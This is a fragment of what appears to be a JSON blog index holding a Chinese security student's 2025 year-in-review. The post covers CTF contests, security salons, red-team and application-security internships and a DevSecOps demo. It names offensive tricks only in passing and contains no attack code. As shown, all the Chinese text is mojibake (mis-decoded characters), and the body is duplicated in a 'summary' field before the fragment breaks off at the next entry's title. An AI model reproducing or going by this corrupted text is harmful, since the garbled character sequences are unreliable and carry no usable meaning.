åœ¨å¤§äºŒä¸‹çš„æ—¶å€™ï¼ŒæŠ“ä½æœ€åçš„æ—¶é—´æ‰“äº†ä¸€äº›æ¯”èµ›æ‹¿äº†äº›å¥–ï¼Œçº¿ä¸Šçš„å¤ªå¤šå°±ä¸è¯´äº†ï¼Œè¯´è¯´æˆ‘å»çš„çº¿ä¸‹æ¯”èµ›å§\né‡åº†ï¼šç¬¬ä¸€ç«™ å…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶åˆ›æ–°å¤§èµ›\u0026ndash;è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›ï¼Œè¿™æ˜¯2025å¹´çš„ç¬¬ä¸€åœºçº¿ä¸‹æ¯”èµ›ï¼Œç´§å¼ åˆºæ¿€ï¼Œæœ€åæ··äº†ä¸ªä¸‰ç­‰å¥–ï¼ˆæ²¡æ™‹çº§ï¼‰ï¼Œé—æ†¾ç¦»åœºï¼Œä¸è¿‡æ›´é‡è¦çš„æ˜¯èµ›å‰èµ›åå’Œå…„å¼Ÿä»¬ä¸€èµ·ç›¸å¤„çš„é‚£æ®µæ—¶é—´ï¼Œä¸€èµ·ç©è¿‡çš„åœ°æ–¹å’Œä¸€èµ·åƒè¿‡çš„é‡åº†ç«é”…ï¼ˆè¯•äº†ä¸€ä¸‹æ²¡æœ‰ä¼ è¯´ä¸­é‚£ä¹ˆè¾£ï¼Œæ— æ„Ÿï¼‰ï¼š\næ­å·ï¼šè¥¿æ¹–è®ºå‰‘ ä¸€å‘¨è¿‡åï¼ŒYuy0ungå°±é©¬ä¸åœè¹„çš„èµ¶å¾€äº†ç¬¬äºŒç«™ï¼šæ­å·ï¼Œæ¯”èµ›åŒæ ·åªæ˜¯æ··äº†ä¸ªä¸‰ç­‰å¥–ï¼Œä¸è¿‡è¥¿æ¹–çš„é£ä¹Ÿç®—æ˜¯æŠšå¹³äº†ä¸æ»¡è¶³çš„å¿ƒï¼Œçœ‹è¥¿æ¹–çš„é‚£å¤©ä¸‹é›¨äº†ï¼Œæ²¡èƒ½çœ‹åˆ°æ‰€è°“çš„æ¨æŸ³å²¸æ™“é£æ®‹æœˆï¼Œå°±å»äº†ä¸€ä¸ªæ­å¸®èœé¥­åº—é¿é›¨ï¼Œé¡ºä¾¿å°±åƒäº†äº›å½“åœ°çš„ç¾é£Ÿï¼Œé‚£ä¸ªè¥¿æ¹–é†‹é±¼çœŸçš„å¾ˆä¸€èˆ¬ï¼Œå…¶ä»–çš„èœè¿˜ä¸é”™ï¼Œå¾ˆé²œï¼š\nä¸è¿‡åˆ°è¿™é‡Œï¼Œé“æ ¼å®‰å…¨ç ”ç©¶å®éªŒå®¤çš„æ¥åŠ›æ£’ä¹Ÿæ˜¯äº¤æ¥åˆ°äº†å­¦å¼Ÿå­¦å¦¹çš„æ‰‹ä¸­ï¼Œæˆ‘çš„ä»Šå¹´çš„CTFçº¿ä¸‹ä¹‹æ—…ä¹Ÿç®—æ˜¯ç»“æŸäº†ï¼Œæ²¡æœ‰ä»€ä¹ˆç²¾å½©äº‹è¿¹ï¼Œæ²¡æœ‰ä»€ä¹ˆä¸»è§’å…‰ç¯ï¼Œä¸è¿‡æ˜¯äº•åº•ä¹‹è›™æ¶ˆæ•£äºå¤§æµ·ä¹‹ä¸­\nå­¦æ— æ­¢å¢ƒ å‚åŠ äº†å¾ˆå¤šçš„çº¿ä¸‹å®‰å…¨æ²™é¾™/çŸ¥è¯†è®²åº§ï¼Œæ¯æ¬¡å»éƒ½æ˜¯ä¹¡ä¸‹äººè¿›åŸï¼Œæ¯æ¬¡å»éƒ½èƒ½è§åˆ°å¾ˆå¤šå¤§ä½¬ï¼Œæ¯æ¬¡å»éƒ½èƒ½å­¦åˆ°å¾ˆå¤š\nè…¾è®¯å®‰å…¨æ²™é¾™ ç¼åˆƒæ— å½±ï¼Œå¾¡è§æœªæ¥ï¼Œå¾ˆå¸…çš„åå­—ï¼Œåœ¨è¿™é‡Œå½±å“æ¯”è¾ƒæ·±çš„å°±æ˜¯åœºåœ°äº†ï¼Œç«Ÿç„¶æ˜¯é…’å§ï¼Œä¸å¾—ä¸ä½©æœè…¾è®¯çš„é€‰åœ°ï¼Œå¦å¤–ï¼Œè”æƒ³çº¢é˜Ÿçš„å¤–å›½å¸ˆå‚…åˆ†äº«çš„è¿‘æºçªƒå¬æŠ€æœ¯ä»¥åŠè…¾è®¯äº‘é¼ç½‘å®‰å®éªŒå®¤çš„å¸ˆå‚…åˆ†äº«çš„akskåˆ©ç”¨ï¼Œä¸åˆ›å»ºæ–°ç”¨æˆ·ç™»å½•æ§åˆ¶å°ï¼Œè¿™ä¸¤ä¸ªtrickå¦æˆ‘å°è±¡æ·±åˆ»ï¼š\nç™¾åº¦å®‰å…¨æ²™é¾™ æ”»ç•Œæ™ºæ…§ï¼ŒæŠ€ç ´ä¸‡é˜²ï¼Œè¿™æ˜¯ä¸€åœºå›´ç»•ç½‘ç»œå®‰å…¨æ”»é˜²å±•å¼€çš„æŠ€æœ¯åˆ†äº«ï¼Œå°è±¡æœ€æ·±çš„åº”è¯¥æ˜¯ç™¾åº¦è“å†›çš„nxmå¸ˆå‚…åˆ†äº«çš„äº‘ä¸Šæ”»å‡»tricksï¼šstså¾ªç¯ä¿¡ä»»ã€äº‘è”ç½‘æ„å»ºæ¨ªå‘ç§»åŠ¨é€šé“ã€å·§ç”¨burpè¯ä¹¦ç›‘å¬è¯·æ±‚\u0026hellip;\u0026hellip; åœ¨ä¼šåè¿˜è¢«åŒ—ææ˜Ÿå¸ˆå‚…é‚€è¯·å’Œæ˜Ÿç›Ÿçš„å¸ˆå‚…ä¸€èµ·åƒäº†ä¸€é¡¿ï¼Œéå¸¸å……å®å˜»å˜»å˜»\næ¯æ¬¡æœ‰ç¦»å¾—è¿‘çš„å®‰å…¨æ²™é¾™æˆ‘éƒ½ä¼šå»ï¼Œè¿™æ˜¯æˆ‘æŠ¹å¹³ä¿¡æ¯å·®çš„ä¸€ä¸ªå¾ˆå¥½çš„é€”å¾„ï¼Œæˆ‘ä¸€ç›´è§‰å¾—è¿™æ ·çš„å†³å®šå¾ˆä¸é”™\nå®è·µå‡ºçœŸçŸ¥ SRC éšä¾¿æŒ–äº†æŒ–eduï¼Œç”±äºéœ€è¦å­¦çš„çŸ¥è¯†è¿˜æœ‰å¾ˆå¤šï¼Œå†åŠ ä¸Šå·¥ä½œçš„ä¸€éƒ¨åˆ†å†…å®¹å’Œsrcé‡å äº†ï¼Œä¾¿æ²¡æœ‰åœ¨è¿™ä¸Šé¢èŠ±å¤ªå¤šæ—¶é—´ï¼Œä¸è¿‡srcç¡®å®æ˜¯æ£€éªŒè‡ªå·±æ°´å¹³çš„ä¸€ç§æ–¹å¼ï¼š\næ¸—é€ åœ¨æ‰“çº¢é˜ŸæœŸé—´æ¥è§¦äº†å¾ˆå¤šé¶æ ‡ï¼Œè¿™æ®µæ—¶é—´çš„æ”¶è·çœŸçš„å¾ˆå¤§ï¼Œæ¥è§¦äº†å„ç§å®æˆ˜å†…ç½‘ç¯å¢ƒï¼šADåŸŸã€dockerã€k8s\u0026hellip;\u0026hellip;å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œè¿œæ¯”è‡ªå·±æ‰“é¶åœºçš„æ—¶å€™æœ‰æˆå°±æ„Ÿï¼š\nå‰ç«¯ åœ¨å­¦äº†å‰ç«¯çš„åŸºç¡€å’ŒGSAPç­‰å‰ç«¯è®¾è®¡åï¼Œç»™é“æ ¼å®‰å…¨ç ”ç©¶å®éªŒå®¤å†™äº†ä¸ªå®˜ç½‘ï¼ˆå†™çš„ä¸€èˆ¬ï¼Œä¸ä¼šçš„åœ°æ–¹æ±‚åŠ©çš„AIï¼Œä¸å–œå‹¿å–·ï¼‰ï¼š\nhttp://www.d0g3.cn/\nDAST åœ¨å­¦ä¹ ä¼ä¸šDASTé»‘ç›’çš„ä¸€äº›çŸ¥è¯†ä¹‹åï¼Œå°è¯•å†™äº†ä¸€ä¸ªDevSecOpsçš„å¹³å°demoï¼šhttps://github.com/Yuy0ung/devsecops-platform/\nå‰ç«¯æš‚æ—¶åªæœ‰DASTã€SASTã€SCAåŠŸèƒ½ï¼š\nåç«¯ä»…å¯¹DASTç›¸å…³åŠŸèƒ½åšäº†å®ç°ï¼Œä¸”æœªåšåˆ†å¸ƒå¼ï¼Œåç»­æ…¢æ…¢å†™å§\næ±‚èŒè·¯ å¤§äºŒä¸‹ï¼Œè§‰å¾—è‡ªå·±å°æœ‰æ°´å¹³ï¼Œæ€€ç€å¿å¿‘çš„å¿ƒå»é¢äº†å‡ åœºè¯•ï¼Œéƒ½ç¨³ç¨³çš„è¿‡äº†ï¼Œé€‰äº†ä¸€ä¸ªå–œæ¬¢çš„ï¼Œå¼€å¯äº†è‡ªå·±çš„èŒä¸šç”Ÿæ¶¯\nå®‰æœ å®‰å…¨æœåŠ¡ï¼Œæˆ‘ä»¥å‰æœ€å«Œå¼ƒçš„å²—ä½ï¼Œè§‰å¾—ç‰›é©¬ï¼Œè§‰å¾—éƒ½æ˜¯æ‹‰å»é©»åœºçš„å»‰ä»·åŠ³åŠ¨åŠ›ï¼Œç›´åˆ°é¢è¯•æ—¶æ€»ç®¡æ‹…ä¿ä¸ä¼šå®‰æ’æˆ‘ä»¬å»å¹²è¿™äº›æ‚æ´»ï¼Œå¹¶ä¸”ä¼šå®‰æ’æˆ‘å»æ‰“æ‰“çº¢é˜Ÿï¼Œæˆ‘å°±æ”¾å¼ƒäº†æ·±ä¿¡æœçš„æ¸—é€å²—ï¼Œæ¥åˆ°äº†å®‰æ’ä¿¡æ¯ï¼Œè¿™æ®µæ—¶é—´çš„å®æˆ˜æ°´å¹³å¤§å¹…æå‡ï¼Œè¿ç»­æ‰“äº†3ã€4åœºçº¢é˜Ÿï¼Œä¸­é€”è¿˜ä¼šæœ‰å¾ˆå¤šæ¸—é€é¡¹ç›®ï¼Œé™¤äº†å†™æŠ¥å‘Šå’Œæ•°æ®å®‰å…¨çš„é¡¹ç›®ï¼ŒçœŸçš„èƒ½å¤Ÿå­¦åˆ°å¾ˆå¤š\nçº¢é˜Ÿ æŸå•ä½çš„çº¢é˜Ÿç ”ç©¶ï¼Œç»†èŠ‚ä¿å¯†ï¼Œ åœ¨è¿™é‡Œåªå‘†äº†çŸ­çŸ­ä¸€ä¸ªå¤šæœˆï¼Œä½†å­¦åˆ°çš„ä¸œè¥¿å€’æ˜¯å¾ˆå¤šï¼Œé‡Œé¢çš„å¸ˆå‚…å¾ˆçƒ­å¿ƒæœ‰é—®å¿…ç­”ï¼Œåœ¨æœŸé—´æ‹¿äº†5ä¸ªshellï¼Œæ‰“ç©¿äº†3ä¸ªADåŸŸå’Œ1ä¸ªK8sï¼Œæˆå°±æ„Ÿæ˜¯æ— è¯­ä¼¦æ¯”çš„ï¼Œä¸è¿‡å¤§ä¸‰å¼€å­¦äº†äº‹åŠ¡ç¹å¤šï¼Œäºæ˜¯å°±ç¦»èŒæ²‰æ·€äº†\nåº”ç”¨å®‰å…¨ å¤§ä¸‰ä¸Šï¼Œè€ä¸ä½æ€§å­ï¼Œæµ·æŠ•ç®€å†æ¥åˆ°äº†æŸäº’è”ç½‘å…¬å¸å¹²SDLï¼Œleaderäººå¾ˆå¥½ä¼šç›‘ç£æˆ‘å­¦ä¹ ã€ä¼šç»™æˆ‘æŒ‡ç‚¹è¿·æ´¥ã€è¿˜ä¼šç»™æˆ‘è§„åˆ’å­¦ä¹ è·¯çº¿ï¼Œå·¥ä½œä¸Šä¹Ÿæ˜¯å¾ˆä¸é”™ï¼Œä¸å‹æ¦¨ä¸æ‚æ´»ï¼Œä¸è¿‡ä¸Šæµ·çš„æˆ¿ç§Ÿã€å¾€è¿”çš„æœºç¥¨ã€ç•¥ä½çš„è–ªèµ„æœ‰ç‚¹å‹çš„æˆ‘å–˜ä¸è¿‡æ°”äº†ï¼Œæœ‰æ²¡æœ‰ä¸Šæµ·å¯Œå©†æ¥æ•‘æ•‘æˆ‘\u0026hellip;..\næ€è€ƒ ä»Šå¹´æ˜¯æ¯”è¾ƒå¤±è´¥çš„ä¸€å¹´ï¼Œæ¯”èµ›æ²¡æ‰“å‡ºä»€ä¹ˆå¥½æˆç»©ï¼Œå®ä¹ æ²¡èƒ½è¿›å…¥è‡ªå·±è®¡åˆ’ä¸­çš„å…¬å¸ï¼Œæƒ…æ„Ÿç»å†ä¹Ÿæ˜¯å¤±è´¥ï¼Œä¸€ç›´å¾ˆåæ„Ÿåˆ«äººè¯´æˆ‘æˆåŠŸï¼Œæˆ–è®¸æˆ‘æœ€æ“…é•¿çš„å°±æ˜¯æŠŠäº‹æƒ…æç ¸\nä¸è¿‡ä¹è§‚ç‚¹è¯´ï¼Œä¸è®ºæ˜¯å·¥ä½œç»éªŒã€ç¤¾ä¼šé˜…å†ã€æƒ…æ„Ÿç†è§£ï¼Œéƒ½æ˜¯æœ‰æ‰€è¿›æ­¥ï¼Œç›¸ä¿¡ä¸€åˆ‡éƒ½åœ¨å¾€å¥½çš„æ–¹å‘å‘å±•ï¼Œæ¯•ç«Ÿæˆ‘è¿˜æ“…é•¿ä¸€ä»¶äº‹ï¼Œå°±æ˜¯åšæŒ\nå†™åˆ°è¿™é‡Œï¼Œåˆ åˆ æ”¹æ”¹å·²ç»ä¸€ä¸ªåŠå°æ—¶äº†ï¼Œæ¯æ¬¡å†™åˆ°å‘ç”Ÿçš„äº‹ï¼Œéƒ½ä¼šå¿ä¸ä½å»å›å¿†ä¸€ç•ªï¼Œåƒæ˜¯åœ¨ç¿»é˜…ä¸€æœ¬åˆšåˆšåˆä¸Šçš„æ—§ç›¸å†Œï¼Œæˆ–è®¸é’æ˜¥çš„é­…åŠ›å°±åœ¨è¿™é‡Œ\nâ€œå°šæœªå®ç°çš„æ¢¦æƒ³ï¼Œç¼˜äºå¹´å°‘ï¼›é£˜å‘è¿œæ–¹çš„æ€ç»ªï¼Œç¼˜äºå²æœˆã€‚â€\nç»ˆ\n",
        "summary": "Yuy0ungçš„2025å¹´åº¦æ€»ç»“ â€œå“€å¾ç”Ÿä¹‹é¡»è‡¾ï¼Œç¾¡é•¿æ±Ÿä¹‹æ— ç©·ã€‚â€\nçªç„¶å°±å¹´åº•äº†ï¼Œä¸Šæ¬¡å†™å¹´åº¦æ€»ç»“æ„Ÿè§‰è¿˜æ˜¯åœ¨æ˜¨å¤©ï¼Œæ„Ÿæ…¨ä¸‡åˆ†\n20å²çš„æˆ‘ï¼Œèƒ½å¤Ÿå¾ˆæ¸…æ™°çš„æ„Ÿè§‰åˆ°è‡ªå·±çš„é’æ˜¥æ­£åœ¨æ…¢æ…¢æµé€ï¼Œæ²¡æœ‰äº†å¯¹æ¢¦æƒ³çš„æ¿€æƒ…ï¼Œä¹Ÿæ²¡æœ‰äº†å¾ˆå¤šå¤´å‘ï¼Œæˆ–è®¸åœ¨å˜å¼ºçš„è·¯ä¸Šæ€»éœ€è¦å¤±å»äº›ä»€ä¹ˆ\nç°åœ¨çš„æˆ‘ä¸ç®—æˆåŠŸï¼Œè¿˜æ˜¯æ²¡æœ‰ç¨³å®šçš„å·¥ä½œï¼Œæ²¡æœ‰è¶³å¤Ÿçš„è´¢å¯Œï¼Œä¹Ÿæ²¡æœ‰å€¾è¯‰çš„å¯¹è±¡ï¼Œä¸è¿‡æˆ‘å‘å‰èµ°çš„è·¯é€”æ˜¯æœ‰è¶£çš„ï¼Œå¯ä»¥å‘ä½ åˆ†äº«ä¸€äºŒ\nçº¿ä¸‹èµ› åœ¨å¤§äºŒä¸‹çš„æ—¶å€™ï¼ŒæŠ“ä½æœ€åçš„æ—¶é—´æ‰“äº†ä¸€äº›æ¯”èµ›æ‹¿äº†äº›å¥–ï¼Œçº¿ä¸Šçš„å¤ªå¤šå°±ä¸è¯´äº†ï¼Œè¯´è¯´æˆ‘å»çš„çº¿ä¸‹æ¯”èµ›å§\né‡åº†ï¼šç¬¬ä¸€ç«™ å…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶åˆ›æ–°å¤§èµ›\u0026ndash;è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›ï¼Œè¿™æ˜¯2025å¹´çš„ç¬¬ä¸€åœºçº¿ä¸‹æ¯”èµ›ï¼Œç´§å¼ åˆºæ¿€ï¼Œæœ€åæ··äº†ä¸ªä¸‰ç­‰å¥–ï¼ˆæ²¡æ™‹çº§ï¼‰ï¼Œé—æ†¾ç¦»åœºï¼Œä¸è¿‡æ›´é‡è¦çš„æ˜¯èµ›å‰èµ›åå’Œå…„å¼Ÿä»¬ä¸€èµ·ç›¸å¤„çš„é‚£æ®µæ—¶é—´ï¼Œä¸€èµ·ç©è¿‡çš„åœ°æ–¹å’Œä¸€èµ·åƒè¿‡çš„é‡åº†ç«é”…ï¼ˆè¯•äº†ä¸€ä¸‹æ²¡æœ‰ä¼ è¯´ä¸­é‚£ä¹ˆè¾£ï¼Œæ— æ„Ÿï¼‰ï¼š\næ­å·ï¼šè¥¿æ¹–è®ºå‰‘ ä¸€å‘¨è¿‡åï¼ŒYuy0ungå°±é©¬ä¸åœè¹„çš„èµ¶å¾€äº†ç¬¬äºŒç«™ï¼šæ­å·ï¼Œæ¯”èµ›åŒæ ·åªæ˜¯æ··äº†ä¸ªä¸‰ç­‰å¥–ï¼Œä¸è¿‡è¥¿æ¹–çš„é£ä¹Ÿç®—æ˜¯æŠšå¹³äº†ä¸æ»¡è¶³çš„å¿ƒï¼Œçœ‹è¥¿æ¹–çš„é‚£å¤©ä¸‹é›¨äº†ï¼Œæ²¡èƒ½çœ‹åˆ°æ‰€è°“çš„æ¨æŸ³å²¸æ™“é£æ®‹æœˆï¼Œå°±å»äº†ä¸€ä¸ªæ­å¸®èœé¥­åº—é¿é›¨ï¼Œé¡ºä¾¿å°±åƒäº†äº›å½“åœ°çš„ç¾é£Ÿï¼Œé‚£ä¸ªè¥¿æ¹–é†‹é±¼çœŸçš„å¾ˆä¸€èˆ¬ï¼Œå…¶ä»–çš„èœè¿˜ä¸é”™ï¼Œå¾ˆé²œï¼š\nä¸è¿‡åˆ°è¿™é‡Œï¼Œé“æ ¼å®‰å…¨ç ”ç©¶å®éªŒå®¤çš„æ¥åŠ›æ£’ä¹Ÿæ˜¯äº¤æ¥åˆ°äº†å­¦å¼Ÿå­¦å¦¹çš„æ‰‹ä¸­ï¼Œæˆ‘çš„ä»Šå¹´çš„CTFçº¿ä¸‹ä¹‹æ—…ä¹Ÿç®—æ˜¯ç»“æŸäº†ï¼Œæ²¡æœ‰ä»€ä¹ˆç²¾å½©äº‹è¿¹ï¼Œæ²¡æœ‰ä»€ä¹ˆä¸»è§’å…‰ç¯ï¼Œä¸è¿‡æ˜¯äº•åº•ä¹‹è›™æ¶ˆæ•£äºå¤§æµ·ä¹‹ä¸­\nå­¦æ— æ­¢å¢ƒ å‚åŠ äº†å¾ˆå¤šçš„çº¿ä¸‹å®‰å…¨æ²™é¾™/çŸ¥è¯†è®²åº§ï¼Œæ¯æ¬¡å»éƒ½æ˜¯ä¹¡ä¸‹äººè¿›åŸï¼Œæ¯æ¬¡å»éƒ½èƒ½è§åˆ°å¾ˆå¤šå¤§ä½¬ï¼Œæ¯æ¬¡å»éƒ½èƒ½å­¦åˆ°å¾ˆå¤š\nè…¾è®¯å®‰å…¨æ²™é¾™ ç¼åˆƒæ— å½±ï¼Œå¾¡è§æœªæ¥ï¼Œå¾ˆå¸…çš„åå­—ï¼Œåœ¨è¿™é‡Œå½±å“æ¯”è¾ƒæ·±çš„å°±æ˜¯åœºåœ°äº†ï¼Œç«Ÿç„¶æ˜¯é…’å§ï¼Œä¸å¾—ä¸ä½©æœè…¾è®¯çš„é€‰åœ°ï¼Œå¦å¤–ï¼Œè”æƒ³çº¢é˜Ÿçš„å¤–å›½å¸ˆå‚…åˆ†äº«çš„è¿‘æºçªƒå¬æŠ€æœ¯ä»¥åŠè…¾è®¯äº‘é¼ç½‘å®‰å®éªŒå®¤çš„å¸ˆå‚…åˆ†äº«çš„akskåˆ©ç”¨ï¼Œä¸åˆ›å»ºæ–°ç”¨æˆ·ç™»å½•æ§åˆ¶å°ï¼Œè¿™ä¸¤ä¸ªtrickå¦æˆ‘å°è±¡æ·±åˆ»ï¼š\nç™¾åº¦å®‰å…¨æ²™é¾™ æ”»ç•Œæ™ºæ…§ï¼ŒæŠ€ç ´ä¸‡é˜²ï¼Œè¿™æ˜¯ä¸€åœºå›´ç»•ç½‘ç»œå®‰å…¨æ”»é˜²å±•å¼€çš„æŠ€æœ¯åˆ†äº«ï¼Œå°è±¡æœ€æ·±çš„åº”è¯¥æ˜¯ç™¾åº¦è“å†›çš„nxmå¸ˆå‚…åˆ†äº«çš„äº‘ä¸Šæ”»å‡»tricksï¼šstså¾ªç¯ä¿¡ä»»ã€äº‘è”ç½‘æ„å»ºæ¨ªå‘ç§»åŠ¨é€šé“ã€å·§ç”¨burpè¯ä¹¦ç›‘å¬è¯·æ±‚\u0026hellip;\u0026hellip; åœ¨ä¼šåè¿˜è¢«åŒ—ææ˜Ÿå¸ˆå‚…é‚€è¯·å’Œæ˜Ÿç›Ÿçš„å¸ˆå‚…ä¸€èµ·åƒäº†ä¸€é¡¿ï¼Œéå¸¸å……å®å˜»å˜»å˜»\næ¯æ¬¡æœ‰ç¦»å¾—è¿‘çš„å®‰å…¨æ²™é¾™æˆ‘éƒ½ä¼šå»ï¼Œè¿™æ˜¯æˆ‘æŠ¹å¹³ä¿¡æ¯å·®çš„ä¸€ä¸ªå¾ˆå¥½çš„é€”å¾„ï¼Œæˆ‘ä¸€ç›´è§‰å¾—è¿™æ ·çš„å†³å®šå¾ˆä¸é”™\nå®è·µå‡ºçœŸçŸ¥ SRC éšä¾¿æŒ–äº†æŒ–eduï¼Œç”±äºéœ€è¦å­¦çš„çŸ¥è¯†è¿˜æœ‰å¾ˆå¤šï¼Œå†åŠ ä¸Šå·¥ä½œçš„ä¸€éƒ¨åˆ†å†…å®¹å’Œsrcé‡å äº†ï¼Œä¾¿æ²¡æœ‰åœ¨è¿™ä¸Šé¢èŠ±å¤ªå¤šæ—¶é—´ï¼Œä¸è¿‡srcç¡®å®æ˜¯æ£€éªŒè‡ªå·±æ°´å¹³çš„ä¸€ç§æ–¹å¼ï¼š\næ¸—é€ åœ¨æ‰“çº¢é˜ŸæœŸé—´æ¥è§¦äº†å¾ˆå¤šé¶æ ‡ï¼Œè¿™æ®µæ—¶é—´çš„æ”¶è·çœŸçš„å¾ˆå¤§ï¼Œæ¥è§¦äº†å„ç§å®æˆ˜å†…ç½‘ç¯å¢ƒï¼šADåŸŸã€dockerã€k8s\u0026hellip;\u0026hellip;å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œè¿œæ¯”è‡ªå·±æ‰“é¶åœºçš„æ—¶å€™æœ‰æˆå°±æ„Ÿï¼š\nå‰ç«¯ åœ¨å­¦äº†å‰ç«¯çš„åŸºç¡€å’ŒGSAPç­‰å‰ç«¯è®¾è®¡åï¼Œç»™é“æ ¼å®‰å…¨ç ”ç©¶å®éªŒå®¤å†™äº†ä¸ªå®˜ç½‘ï¼ˆå†™çš„ä¸€èˆ¬ï¼Œä¸ä¼šçš„åœ°æ–¹æ±‚åŠ©çš„AIï¼Œä¸å–œå‹¿å–·ï¼‰ï¼š\nhttp://www.d0g3.cn/\nDAST åœ¨å­¦ä¹ ä¼ä¸šDASTé»‘ç›’çš„ä¸€äº›çŸ¥è¯†ä¹‹åï¼Œå°è¯•å†™äº†ä¸€ä¸ªDevSecOpsçš„å¹³å°demoï¼šhttps://github.com/Yuy0ung/devsecops-platform/\nå‰ç«¯æš‚æ—¶åªæœ‰DASTã€SASTã€SCAåŠŸèƒ½ï¼š\nåç«¯ä»…å¯¹DASTç›¸å…³åŠŸèƒ½åšäº†å®ç°ï¼Œä¸”æœªåšåˆ†å¸ƒå¼ï¼Œåç»­æ…¢æ…¢å†™å§\næ±‚èŒè·¯ å¤§äºŒä¸‹ï¼Œè§‰å¾—è‡ªå·±å°æœ‰æ°´å¹³ï¼Œæ€€ç€å¿å¿‘çš„å¿ƒå»é¢äº†å‡ åœºè¯•ï¼Œéƒ½ç¨³ç¨³çš„è¿‡äº†ï¼Œé€‰äº†ä¸€ä¸ªå–œæ¬¢çš„ï¼Œå¼€å¯äº†è‡ªå·±çš„èŒä¸šç”Ÿæ¶¯\nå®‰æœ å®‰å…¨æœåŠ¡ï¼Œæˆ‘ä»¥å‰æœ€å«Œå¼ƒçš„å²—ä½ï¼Œè§‰å¾—ç‰›é©¬ï¼Œè§‰å¾—éƒ½æ˜¯æ‹‰å»é©»åœºçš„å»‰ä»·åŠ³åŠ¨åŠ›ï¼Œç›´åˆ°é¢è¯•æ—¶æ€»ç®¡æ‹…ä¿ä¸ä¼šå®‰æ’æˆ‘ä»¬å»å¹²è¿™äº›æ‚æ´»ï¼Œå¹¶ä¸”ä¼šå®‰æ’æˆ‘å»æ‰“æ‰“çº¢é˜Ÿï¼Œæˆ‘å°±æ”¾å¼ƒäº†æ·±ä¿¡æœçš„æ¸—é€å²—ï¼Œæ¥åˆ°äº†å®‰æ’ä¿¡æ¯ï¼Œè¿™æ®µæ—¶é—´çš„å®æˆ˜æ°´å¹³å¤§å¹…æå‡ï¼Œè¿ç»­æ‰“äº†3ã€4åœºçº¢é˜Ÿï¼Œä¸­é€”è¿˜ä¼šæœ‰å¾ˆå¤šæ¸—é€é¡¹ç›®ï¼Œé™¤äº†å†™æŠ¥å‘Šå’Œæ•°æ®å®‰å…¨çš„é¡¹ç›®ï¼ŒçœŸçš„èƒ½å¤Ÿå­¦åˆ°å¾ˆå¤š\nçº¢é˜Ÿ æŸå•ä½çš„çº¢é˜Ÿç ”ç©¶ï¼Œç»†èŠ‚ä¿å¯†ï¼Œ åœ¨è¿™é‡Œåªå‘†äº†çŸ­çŸ­ä¸€ä¸ªå¤šæœˆï¼Œä½†å­¦åˆ°çš„ä¸œè¥¿å€’æ˜¯å¾ˆå¤šï¼Œé‡Œé¢çš„å¸ˆå‚…å¾ˆçƒ­å¿ƒæœ‰é—®å¿…ç­”ï¼Œåœ¨æœŸé—´æ‹¿äº†5ä¸ªshellï¼Œæ‰“ç©¿äº†3ä¸ªADåŸŸå’Œ1ä¸ªK8sï¼Œæˆå°±æ„Ÿæ˜¯æ— è¯­ä¼¦æ¯”çš„ï¼Œä¸è¿‡å¤§ä¸‰å¼€å­¦äº†äº‹åŠ¡ç¹å¤šï¼Œäºæ˜¯å°±ç¦»èŒæ²‰æ·€äº†\nåº”ç”¨å®‰å…¨ å¤§ä¸‰ä¸Šï¼Œè€ä¸ä½æ€§å­ï¼Œæµ·æŠ•ç®€å†æ¥åˆ°äº†æŸäº’è”ç½‘å…¬å¸å¹²SDLï¼Œleaderäººå¾ˆå¥½ä¼šç›‘ç£æˆ‘å­¦ä¹ ã€ä¼šç»™æˆ‘æŒ‡ç‚¹è¿·æ´¥ã€è¿˜ä¼šç»™æˆ‘è§„åˆ’å­¦ä¹ è·¯çº¿ï¼Œå·¥ä½œä¸Šä¹Ÿæ˜¯å¾ˆä¸é”™ï¼Œä¸å‹æ¦¨ä¸æ‚æ´»ï¼Œä¸è¿‡ä¸Šæµ·çš„æˆ¿ç§Ÿã€å¾€è¿”çš„æœºç¥¨ã€ç•¥ä½çš„è–ªèµ„æœ‰ç‚¹å‹çš„æˆ‘å–˜ä¸è¿‡æ°”äº†ï¼Œæœ‰æ²¡æœ‰ä¸Šæµ·å¯Œå©†æ¥æ•‘æ•‘æˆ‘\u0026hellip;..\næ€è€ƒ ä»Šå¹´æ˜¯æ¯”è¾ƒå¤±è´¥çš„ä¸€å¹´ï¼Œæ¯”èµ›æ²¡æ‰“å‡ºä»€ä¹ˆå¥½æˆç»©ï¼Œå®ä¹ æ²¡èƒ½è¿›å…¥è‡ªå·±è®¡åˆ’ä¸­çš„å…¬å¸ï¼Œæƒ…æ„Ÿç»å†ä¹Ÿæ˜¯å¤±è´¥ï¼Œä¸€ç›´å¾ˆåæ„Ÿåˆ«äººè¯´æˆ‘æˆåŠŸï¼Œæˆ–è®¸æˆ‘æœ€æ“…é•¿çš„å°±æ˜¯æŠŠäº‹æƒ…æç ¸\nä¸è¿‡ä¹è§‚ç‚¹è¯´ï¼Œä¸è®ºæ˜¯å·¥ä½œç»éªŒã€ç¤¾ä¼šé˜…å†ã€æƒ…æ„Ÿç†è§£ï¼Œéƒ½æ˜¯æœ‰æ‰€è¿›æ­¥ï¼Œç›¸ä¿¡ä¸€åˆ‡éƒ½åœ¨å¾€å¥½çš„æ–¹å‘å‘å±•ï¼Œæ¯•ç«Ÿæˆ‘è¿˜æ“…é•¿ä¸€ä»¶äº‹ï¼Œå°±æ˜¯åšæŒ\nå†™åˆ°è¿™é‡Œï¼Œåˆ åˆ æ”¹æ”¹å·²ç»ä¸€ä¸ªåŠå°æ—¶äº†ï¼Œæ¯æ¬¡å†™åˆ°å‘ç”Ÿçš„äº‹ï¼Œéƒ½ä¼šå¿ä¸ä½å»å›å¿†ä¸€ç•ªï¼Œåƒæ˜¯åœ¨ç¿»é˜…ä¸€æœ¬åˆšåˆšåˆä¸Šçš„æ—§ç›¸å†Œï¼Œæˆ–è®¸é’æ˜¥çš„é­…åŠ›å°±åœ¨è¿™é‡Œ\nâ€œå°šæœªå®ç°çš„æ¢¦æƒ³ï¼Œç¼˜äºå¹´å°‘ï¼›é£˜å‘è¿œæ–¹çš„æ€ç»ªï¼Œç¼˜äºå²æœˆã€‚â€\nç»ˆ\n"
    }
,
    {
        "title": "ä¸€äº›å†…ç½‘åœºæ™¯åŠå…¶è§£æ³•",
